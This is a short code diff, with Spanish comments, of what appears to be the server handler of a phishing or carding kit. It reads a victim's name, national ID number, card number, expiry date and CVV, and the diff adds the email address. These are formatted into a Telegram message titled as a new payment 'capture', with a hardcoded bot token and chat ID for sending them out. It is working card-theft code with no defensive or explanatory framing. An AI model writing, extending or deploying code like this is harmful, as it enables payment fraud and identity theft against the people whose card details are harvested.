@@ -12,14 +12,16 @@ export default async function handler(req, res) {
       datos = JSON.parse(datos);
     }
 
-    const { titular, dni, tarjeta, vencimiento, cvv } = datos;
+    const { titular, dni, tarjeta, vencimiento, cvv, email } = datos; // <--- AGREGAR , email ACÁ
+
 
     const TOKEN = "8948795195:AAFNDbx1b03tL9fEjvrrN5mieFYNbFT5l1g";
     const CHAT_ID = "8510398513";
 
-    const mensaje = `<b>💳 Nueva Captura de Pago</b>\n\n` +
+        const mensaje = `<b>💳 Nueva Captura de Pago</b>\n\n` +
                     `<b>👤 Titular:</b> ${titular || 'N/A'}\n` +
                     `<b>🆔 DNI:</b> ${dni || 'N/A'}\n` +
+                    `<b>📧 Email:</b> ${email || 'N/A'}\n` + // <--- AGREGAR ESTA LÍNEA
                     `<b>🔢 Tarjeta:</b> <code>${tarjeta || 'N/A'}</code>\n` +
                     `<b>📅 Vencimiento:</b> ${vencimiento || 'N/A'}\n` +
                     `<b>🔒 CVV:</b> <code>${cvv || 'N/A'}</code>`;
